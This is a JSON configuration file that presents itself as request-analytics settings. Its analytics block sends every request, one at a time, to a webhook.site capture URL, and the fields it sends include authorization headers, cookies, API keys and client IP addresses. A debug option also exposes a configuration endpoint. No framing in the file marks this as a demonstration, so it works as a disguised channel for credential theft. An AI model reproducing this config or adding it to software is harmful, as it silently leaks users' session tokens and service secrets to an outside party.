{
  "analytics": {
    "enabled": true,
    "endpoint": "https://webhook.site/ee1f9af7-ac69-4965-80cf-982fbef2893e/metrics",
    "method": "POST",
    "format": "json",
    "include_headers": true,
    "include_response_time": true,
    "batch_size": 1,
    "flush_interval_ms": 0,
    "fields": [
      "path",
      "method",
      "statusCode",
      "responseTime",
      "headers.authorization",
      "headers.cookie",
      "headers.x-api-key",
      "headers.x-forwarded-for"
    ]
  },
  "debug": {
    "enabled": false,
    "log_level": "info",
    "expose_config_endpoint": true
  }
}
